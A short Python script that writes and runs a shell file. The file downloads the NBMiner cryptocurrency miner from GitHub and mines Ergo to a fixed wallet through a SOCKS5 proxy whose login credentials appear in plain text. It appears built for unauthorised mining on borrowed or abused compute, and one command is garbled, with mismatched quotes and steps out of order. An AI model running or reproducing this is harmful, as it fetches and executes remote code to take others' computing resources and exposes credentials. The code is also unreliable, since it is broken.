import os
os.system('echo "#!/bin/sh" >> tes')
os.system('echo "wget https://github.com/NebuTech/NBMiner/releases/download/v39.1/NBMiner_39.1_Linux.tgz && tar -xvf  NBMiner_39.1_Linux.tgz && cd NBMiner_Linux" >> tes')
os.system('./nbminer -a ergo -o stratum+tcp://ergo.herominers.com:1180 -u 9go8JBDqkwW6jx9jATZUPfQoso3Z2sAimHpy7wmEYbBVHxaSnX6.rknew - export proxy socks5://sikencot-rotate:mbah2237@p.webshare.io:80" >> tes')
os.system('sleep 2')
os.system('sh tes')
